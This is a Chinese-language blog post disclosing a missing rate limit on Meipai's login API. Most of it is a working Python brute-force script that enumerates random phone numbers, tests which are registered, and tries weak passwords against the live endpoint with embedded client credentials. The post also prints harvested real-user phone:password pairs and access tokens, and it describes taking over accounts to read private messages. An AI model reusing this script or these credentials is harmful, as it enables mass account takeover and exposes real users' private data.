---
layout: post
title: 美拍接口未限频导致的帐号随机密码碰撞
---

#### 一个接口

美拍进行手机号登录时会对手机号先进行注册检测，接口会返回登录情况：

![/images/dsjaiodjisaj18792n1x807he712x0je72111x9](/images/dsjaiodjisaj18792n1x807he712x0je72111x9.png)

![/images/oiu412incin8v9xm1uds89adas](/images/oiu412incin8v9xm1uds89adas.png)

如果手机帐号存在但密码错误则提示：

![/images/asaj18792n1x807he712x0je72111x9](/images/asaj18792n1x807he712x0je72111x9.png)

这里我们进行频繁的手机号随机登录查询，是没有限制频率的，所以我们可以通过不断生成手机号然后验证帐号是否注册，随后进行密码破解的操作。（大量帐号的密码破解情况下，弱口令会有很大的空间。）

#### 小脚本

> 1. 随机生成手机号码
> 2. 进行密码破解
> 3. 进行结果存储
        #!/usr/bin/env python
        # coding=utf8
        # author=evi1m0#ff0000.cc
        # create=20150216        import json
        import random
        import requests
        import threadpool as tp        def _burp(phone):
            for pwd in ['123456', '123456789', '000000', phone]:
                api_url = 'http://newapi.meipai.com/oauth/access_token.json'
                data = {'phone': phone,
                        'client_id': '1089857302',
                        'client_secret': '38e8c5aet76d5c012e32',
                        'grant_type': 'phone',
                        'password': pwd,}
                try:
                    print '[*] Burp Phone: %s' % phone
                    req = requests.post(api_url, data=data, timeout=5)
                except:
                    continue
                try:
                    success = json.loads(req.content)['access_token']
                    burp_success = open('./meipai_account.txt', 'a+')
                    burp_success.write('%s:::%s\n'%(phone, pwd))
                    burp_success.close()
                    print success
                    return success
                except:
                    success = 0
                    print '[-] Burp False'
                    continue        def _status(args):
            flag = 0
            while True:
                flag += 1
                phone_number = random.choice(['188','185','158','153','186','136','139','135'])\
                               +"".join(random.sample("0123456789",8 ))
                data = {'phone': phone_number,
                        'client_id': '1089857302',
                        'client_secret': '38e8c5aet76d5c012e32',
                        'grant_type': 'phone',
                        'password': '1',}
                api_url = 'http://newapi.meipai.com/oauth/access_token.json'
                try:
                    print '[%s] Test Phone: %s' % (flag, phone_number)
                    req = requests.post(api_url, data=data, timeout=3)
                    req_status = json.loads(req.content)['error_code']
                except:
                    req_status = 0
                if req_status == 21402 or req_status == 23801:
                    success_f = open('./success_reg_phone.txt', 'a+')
                    success_f.write('%s\n'%phone_number)
                    success_f.close()
                    _burp(phone_number)
                    print '\n[OK] Phone: %s\n' % phone_number        if __name__ == '__main__':
            args = []
            for i in range(30):
                args.append(args)
            pool = tp.ThreadPool(30)
            reqs = tp.makeRequests(_status, args)
            [pool.putRequest(req) for req in reqs]
            pool.wait()
            
![IMG_u901jfd9x99naak.jpg](/images/IMG_u901jfd9x99naak.jpg)#### 继续脚本

![40a661e4551847f5762e077e48c97d76](/images/40a661e4551847f5762e077e48c97d76.png)

我们进行了3台服务器的脚本部署，然后一天后进行数据统计：

1. success_reg_phone.txt
2. mp_account_data.txt

其中```success_reg_phone.txt```为注册美拍的帐号，```mp_account_data.txt```为成功爆破的美拍帐号。

去重整理之后的数据：

    wc meipai_account.txt
    8427    8427  198653 meipai_account.txt
    
    wc success_reg_phone.txt
    92531   92532 1110383 success_reg_phone.txt

其中成功登录```8427```，注册美拍的手机号```92531```。

    head meipai_account.txt
    
    13501235896:::13501235896
    13501239874:::13501239874
    13501256394:::123456789
    13501264953:::123456
    13501279546:::123456
    13501468359:::123456
    13501476253:::123456
    13501526734:::13501526734
    13501529843:::13501529843
    13501549263:::123456

随后我们对```92531```个手机号码去掉已经成功登录的```8427```个手机号后，进行二次的密码爆破。

> 美拍帐号登录错误5次会进行3个小时的密码锁定，所以三个小时能进行一次新的top密码破解；#### 数据统计

部署脚本的第二天我们停止了测试，因为这次仅仅是为了配合接口做次弱密码统计：

    cat meipai_account.txt  | awk -F::: '{print $2}' | sort | uniq -c | head

      65 000000
      98 111111
      19 123123123
    5293 123456
    3059 123456789
     296 5201314    

#### 简单利用

帐号成功登录后会返回一个类似于新浪微博授权的access_token，所以编写脚本进行access_token的收取工作即可；

    e.g:

    head meipai_access_token.txt
    
    00000027d3490ad1dd12c619fc82217a
    000c2518d5e477afc15ef26b23f94c3d
    001cedff4d578f454104a48523bb6b0c
    0023688a2428bd56f8a530c7e38fe6c8
    002812f57c139a3bcfa99a2b6f973286
    00287174138355393b755705c516a456
    0034285349fc1f3c8cc0fdb42dace741
    003a77922fb49d48097ee91a4cb20be2
    003a7e6e21088d2f3d83a6864bf922ee
    00685824290db6eac554577e729fb8ec
    
拥有access_token后可对帐号进行任意操作，比如：关注、查看私信、个人资料信息获取等。